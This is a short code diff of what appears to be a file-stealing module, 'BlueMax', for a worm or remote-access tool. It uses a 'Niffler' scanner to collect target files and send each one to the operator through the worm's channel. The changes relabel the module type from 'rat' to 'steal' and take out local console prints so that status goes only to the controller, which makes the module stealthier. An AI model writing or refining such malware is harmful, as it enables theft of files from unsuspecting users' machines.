@@ -43,7 +43,7 @@
 from time import sleep
 
 class BlueMax:
-    MTYPES = "rat"
+    MTYPES = "steal"
     STAND_TH = False
     def __init__(self, master_worm: object):
         self.worm = master_worm
@@ -72,13 +72,11 @@ class BlueMax:
         else:
             self.NIFFLER.start()
     
-    
     def sendTargets(self) -> None:
         if self.FLAG_WORK_NIFFLER:
             self.worm.send_msg("ERROR: Niffler is still looking for files.")
-            print("ERROR Niffler still working")
             return
-        print("Start sending files....")
+        self.worm.send_msg("Start send files....")
         for t in self.TARGETS:
             self.worm.send_file(t)
             sleep(self.pause_send_file)
@@ -100,7 +98,6 @@ class BlueMax:
         while self.FLAG_WORK_NIFFLER:
             sleep(1)
         self.worm.send_msg("Niffler has scanned the files. They are ready to be sent.")
-        print("BlueMax DONE !")
         if self.auto_start:
             self.sendTargets()
 
